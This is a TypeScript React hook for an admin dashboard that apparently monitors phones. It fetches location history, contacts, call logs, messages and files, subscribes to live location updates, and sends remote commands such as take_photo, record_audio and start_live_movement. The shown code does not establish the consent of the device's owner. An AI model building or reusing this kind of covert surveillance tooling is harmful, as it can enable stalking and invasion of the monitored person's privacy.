// components/admin/devices/useDeviceDetail.ts
"use client";

import { useEffect, useState, useCallback, useRef } from "react";
import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage, DeviceFileItem } from "@/lib/device-types";
import { AudioCapture } from "@/components/admin/devices/DeviceAudioGallery";
import { createClient } from "@/lib/supabase/client";
import { useDeviceActions } from "@/components/admin/devices/useDeviceActions";

const CACHE_TTL = 300000; // 5 minutes per Rule 12
const tabCache = new Map<string, { data: any; time: number }>();

export function useDeviceDetail(deviceId: string, checkTabEnabled?: (tab: string) => boolean) {
  const [device, setDevice] = useState<MonitoredDevice | null>(null), [locations, setLocations] = useState<DeviceLocation[]>([]);
  const [contacts, setContacts] = useState<DeviceContact[]>([]), [calls, setCalls] = useState<DeviceCall[]>([]);
  const [messages, setMessages] = useState<DeviceMessage[]>([]), [captures, setCaptures] = useState<any[]>([]);
  const [audioClips, setAudioClips] = useState<AudioCapture[]>([]), [files, setFiles] = useState<DeviceFileItem[]>([]);
  const [filesLoading, setFilesLoading] = useState(false), [tabLoading, setTabLoading] = useState(false);
  const [appCount, setAppCount] = useState(0), [activeTab, setActiveTab] = useState("map");
  const [loading, setLoading] = useState(true), [isRefreshing, setIsRefreshing] = useState(false);
  const [toast, setToast] = useState<string | null>(null), [isLiveMovement, setIsLiveMovement] = useState(false);
  const [locationMode, setLocationMode] = useState<"realtime" | "fetch">("fetch");

  const abortRef = useRef<AbortController | null>(null);
  const supabaseRef = useRef(createClient());
  const showToast = (msg: string) => { setToast(msg); setTimeout(() => setToast(null), 3500); };

  const fetchLightStatus = useCallback(async () => {
    if (!deviceId) return;
    try {
      const t = Date.now();
      const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };
      const [devRes, locRes, cmdRes] = await Promise.all([
        fetch(`/api/devices/${deviceId}?_t=${t}`, noStore).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/data?type=locations&limit=25&_t=${t}`, noStore).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/commands?type=media&_t=${t}`, noStore).then((r) => r.json()),
      ]);

      if (devRes.device) {
        setDevice(devRes.device);
        if (devRes.device.counts?.apps) setAppCount(devRes.device.counts.apps);
      }
      if (locRes.locations) setLocations(locRes.locations);
      if (cmdRes.commands) {
        setCaptures(cmdRes.commands.filter((c: any) => c.command === "take_photo" && c.result_media_path));
        setAudioClips(cmdRes.commands.filter((c: any) => c.command === "record_audio" && c.result_media_path));
      }
    } catch (err) {
      console.error("Telemetry fetch error", err);
    } finally {
      setLoading(false);
    }
  }, [deviceId]);

  const fetchTabData = useCallback(async (tab: string, bypass = false, forceEnabled?: boolean) => {
    if (!deviceId) return;
    const isEnabled = forceEnabled !== undefined ? forceEnabled : (checkTabEnabled ? checkTabEnabled(tab) : false);

    const cacheKey = `${deviceId}:${tab}`;
    const cached = tabCache.get(cacheKey);

    // If tab is disabled and this is not an explicit user bypass ("Fetch Once"), do NOT call API
    if (!isEnabled && !bypass) {
      if (cached) {
        if (tab === "contacts") setContacts(cached.data);
        else if (tab === "calls") setCalls(cached.data);
        else if (tab === "messages") setMessages(cached.data);
        else if (tab === "gallery") setFiles(cached.data);
      }
      return;
    }

    if (abortRef.current) abortRef.current.abort();
    const controller = new AbortController();
    abortRef.current = controller;

    if (!bypass && cached && Date.now() - cached.time < CACHE_TTL) {
      if (tab === "contacts") setContacts(cached.data);
      else if (tab === "calls") setCalls(cached.data);
      else if (tab === "messages") setMessages(cached.data);
      else if (tab === "gallery") setFiles(cached.data);
      return;
    }

    const t = Date.now();
    const opts = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" }, signal: controller.signal };
    const load = async (type: string, limit: number, setter: (d: any) => void) => {
      if (tab === "gallery") setFilesLoading(true);
      else setTabLoading(true);
      try {
        const res = await fetch(`/api/devices/${deviceId}/data?type=${type}&limit=${limit}&_t=${t}`, opts);
        if (controller.signal.aborted) return;
        const json = await res.json();
        if (json[type]) {
          setter(json[type]);
          tabCache.set(cacheKey, { data: json[type], time: Date.now() });
        }
      } catch (e: any) {
        if (e.name !== "AbortError") console.error(e);
      } finally {
        if (tab === "gallery") setFilesLoading(false);
        else setTabLoading(false);
      }
    };

    if (tab === "contacts") await load("contacts", 10000, setContacts);
    else if (tab === "calls") await load("calls", 5000, setCalls);
    else if (tab === "messages") await load("messages", 5000, setMessages);
    else if (tab === "gallery") await load("files", 1000, setFiles);
  }, [deviceId, checkTabEnabled]);

  useEffect(() => { fetchTabData(activeTab); }, [activeTab, fetchTabData]);

  // Periodic light status poll (30s interval, pauses when tab is hidden)
  useEffect(() => {
    fetchLightStatus();
    let interval: NodeJS.Timeout | null = setInterval(() => {
      if (typeof document !== "undefined" && !document.hidden) fetchLightStatus();
    }, 30000);
    const onVisibility = () => {
      if (!document.hidden) fetchLightStatus();
    };
    document.addEventListener("visibilitychange", onVisibility);
    return () => {
      if (interval) clearInterval(interval);
      document.removeEventListener("visibilitychange", onVisibility);
    };
  }, [fetchLightStatus]);

  // Live location subscription — active only when locationMode === "realtime"
  useEffect(() => {
    if (!deviceId || locationMode !== "realtime") return;
    const sb = supabaseRef.current;
    const pgChannel = sb.channel(`pg-location:${deviceId}`)
      .on("postgres_changes", {
        event: "UPDATE", schema: "public", table: "monitored_devices",
        filter: `id=eq.${deviceId}`,
      }, (payload: any) => {
        const row = payload.new;
        if (row?.current_latitude && row?.current_longitude && Math.abs(row.current_latitude) > 0.001) {
          setLocations((prev) => {
            const loc = {
              id: `live-${Date.now()}`, device_id: deviceId,
              latitude: row.current_latitude, longitude: row.current_longitude,
              accuracy: row.current_accuracy || 5, speed: null, altitude: null,
              battery_level: row.battery_level, created_at: row.location_updated_at || new Date().toISOString(),
            };
            if (prev[0] && Math.abs(prev[0].latitude - loc.latitude) < 0.00001 && Math.abs(prev[0].longitude - loc.longitude) < 0.00001) return prev;
            return [loc, ...prev.slice(0, 49)];
          });
        }
      }).subscribe();
    return () => { sb.removeChannel(pgChannel); };
  }, [deviceId, locationMode]);

  // Live movement Broadcast subscription (only active when Track is ON)
  useEffect(() => {
    if (!deviceId || !isLiveMovement) return;
    const sb = supabaseRef.current;
    const channel = sb.channel(`device-live:${deviceId}`)
      .on("broadcast", { event: "location" }, (p: any) => {
        if (p.payload?.latitude && p.payload?.longitude) setLocations((prev) => [p.payload, ...prev.slice(0, 49)]);
      }).subscribe();
    return () => { sb.removeChannel(channel); };
  }, [deviceId, isLiveMovement]);

  const sendCommand = async (command: string, payload = {}, label = "Command") => {
    await fetch(`/api/devices/${deviceId}/commands`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command, payload }),
    });
    showToast(`${label} sent to phone!`);
    fetchLightStatus();
  };

  const handleToggleLiveMovement = (active: boolean) => {
    setIsLiveMovement(active);
    sendCommand(active ? "start_live_movement" : "stop_live_movement", {}, active ? "Live Movement ON" : "Live Movement OFF");
  };

  const actions = useDeviceActions({
    deviceId, showToast, tabCache, fetchLightStatus, captures, audioClips, files,
    setCaptures, setAudioClips, setContacts, setCalls, setMessages, setFiles,
  });

  return {
    device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, tabLoading, appCount,
    activeTab, setActiveTab, loading, isRefreshing, toast, isLiveMovement, locationMode, setLocationMode,
    handleFullRefresh: async () => {
      setIsRefreshing(true); showToast("🔄 Refreshing device telemetry...");
      const isEnabled = checkTabEnabled ? checkTabEnabled(activeTab) : false;
      const tasks: Promise<any>[] = [fetchLightStatus()];
      if (isEnabled) { tabCache.delete(`${deviceId}:${activeTab}`); tasks.push(fetchTabData(activeTab, true, true)); }
      await Promise.all(tasks);
      showToast("✅ Telemetry updated!"); setIsRefreshing(false);
    },
    fetchTabData, handleToggleLiveMovement, sendCommand, ...actions,
  };
}
